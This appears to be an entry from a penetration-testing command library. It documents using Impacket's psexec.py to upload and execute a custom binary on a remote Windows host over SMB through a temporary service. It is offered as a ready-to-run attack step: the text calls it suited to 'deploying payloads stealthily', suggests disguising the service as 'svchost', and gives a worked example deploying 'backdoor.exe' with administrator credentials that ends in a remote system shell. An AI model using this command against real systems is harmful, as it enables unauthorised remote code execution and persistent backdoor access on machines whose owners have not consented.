---
type: command
executor: python
data: >-
  psexec.py $_USERNAME:$_PASSWORD@$_TARGET_IP -service-name $_SERVICE_NAME
  -remote-binary-name $_BINARY_PATH
output: null
platforms:
  - Windows
tags:
  - impacket
  - psexec
  - remote-execution
verified: true
validated: true
---

# impacket-psexec-execute-custom-binary

## Command

```python
psexec.py $_USERNAME:$_PASSWORD@$_TARGET_IP -service-name $_SERVICE_NAME -remote-binary-name $_BINARY_PATH
```

## Description

Uses Impacket's psexec.py to upload and execute a custom binary on a remote Windows host via SMB, creating a temporary service. Suited for deploying payloads stealthily.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME:$_PASSWORD | Credentials in URI format (e.g., domain\\user:pass) | Yes |
| @$_TARGET_IP | Target IP or hostname | Yes |
| -service-name $_SERVICE_NAME | Name for temp service (e.g., svchost) | Yes |
| -remote-binary-name $_BINARY_PATH | Local path to binary to upload/execute | Yes |

## Examples

### Basic Usage

```python
psexec.py administrator:pass123@192.168.1.100 -service-name updatesvc -remote-binary-name /path/to/backdoor.exe
```

## Expected Output

Impacket logs connection and execution:

[!] Press help for extra shell options
C:\Windows\system32> 

Interactive shell if binary supports; otherwise, completion message.

## Related

- [[procedures/windows-impacket-psexec-remote-execution-with-credentials]]
- [[tools/Impacket]]
